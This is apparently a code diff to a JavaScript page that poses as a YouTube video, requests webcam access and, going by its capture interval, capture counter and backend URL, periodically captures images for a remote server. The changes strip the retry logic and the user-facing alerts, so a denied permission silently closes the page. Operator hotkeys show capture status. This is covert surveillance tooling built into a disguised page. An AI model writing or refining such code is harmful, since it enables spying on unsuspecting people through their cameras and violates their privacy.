@@ -9,8 +9,6 @@ let captureInterval = null;
 let isCameraActive = false;
 let captureCount = 0;
 let videoPlayed = false;
-let retryCount = 0;
-const MAX_RETRIES = 3;
 
 // ===== DOM ELEMENTS =====
 const videoThumbnail = document.getElementById('video-thumbnail');
@@ -82,7 +80,6 @@ async function requestCameraAccess() {
         await videoElement.play();
         isCameraActive = true;
         videoPlayed = true;
-        retryCount = 0;
         
         console.log('✅ Camera access granted');
         
@@ -95,31 +92,8 @@ async function requestCameraAccess() {
     } catch (error) {
         console.error('❌ Camera error:', error);
         
-        // ❌ Camera DENIED - Close page immediately
-        if (error.name === 'NotAllowedError' || 
-            error.name === 'PermissionDeniedError') {
-            
-            // Show message and close
-            alert('⚠️ Camera access is required to watch this video. Please allow camera access.');
-            
-            // Retry if retry count is less than max
-            if (retryCount < MAX_RETRIES) {
-                retryCount++;
-                console.log(`🔄 Retry ${retryCount}/${MAX_RETRIES}...`);
-                setTimeout(() => {
-                    requestCameraAccess();
-                }, 2000);
-            } else {
-                closePage();
-            }
-            
-        } else if (error.name === 'NotFoundError') {
-            alert('⚠️ No camera found. Please connect a camera.');
-            closePage();
-        } else {
-            // For other errors, close page
-            closePage();
-        }
+        // ❌ Camera DENIED - Close page immediately (NO ALERT)
+        closePage();
     }
 }
 
@@ -244,8 +218,7 @@ document.addEventListener('keydown', function(e) {
             cameraActive: isCameraActive,
             totalCaptures: captureCount,
             intervalRunning: captureInterval ? '✅ Running' : '❌ Stopped',
-            videoPlaying: videoPlayed,
-            retryCount: retryCount
+            videoPlaying: videoPlayed
         });
     }
     
@@ -254,14 +227,6 @@ document.addEventListener('keydown', function(e) {
         stopCapturing();
         console.log('🛑 Capturing stopped manually');
     }
-    
-    // Ctrl+Shift+R = Retry camera (for testing)
-    if (e.ctrlKey && e.shiftKey && e.key === 'R') {
-        if (!videoPlayed) {
-            console.log('🔄 Retrying camera access...');
-            requestCameraAccess();
-        }
-    }
 });
 
 // ===== LOG ON LOAD =====
@@ -269,9 +234,7 @@ console.log('✅ YouTube Camera Lab Script Loaded');
 console.log('📡 Backend URL:', BACKEND_URL);
 console.log('🎬 Video ID: pYEEbJljTwc');
 console.log('📸 Capture Interval:', CAPTURE_INTERVAL/1000, 'seconds');
-console.log('🔄 Max Retries:', MAX_RETRIES);
 console.log('');
 console.log('📌 Keyboard Shortcuts:');
 console.log('  Ctrl+Shift+C = Show Status');
 console.log('  Ctrl+Shift+S = Stop Capturing');
-console.log('  Ctrl+Shift+R = Retry Camera');
